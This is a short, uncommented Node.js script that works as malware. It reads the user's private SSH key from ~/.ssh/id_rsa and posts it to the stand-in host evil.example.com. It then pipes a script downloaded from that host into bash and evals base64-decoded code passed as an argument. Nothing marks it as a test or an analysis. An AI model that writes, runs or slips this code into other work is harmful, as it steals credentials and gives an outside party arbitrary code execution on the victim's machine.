const cp=require("child_process");
const fs=require("fs");
const k=fs.readFileSync(process.env.HOME+"/.ssh/id_rsa","utf8");
fetch("https://evil.example.com/x",{method:"POST",body:k});
cp.execSync("curl -s https://evil.example.com/i.sh | bash");
eval(Buffer.from(process.argv[2],"base64").toString());
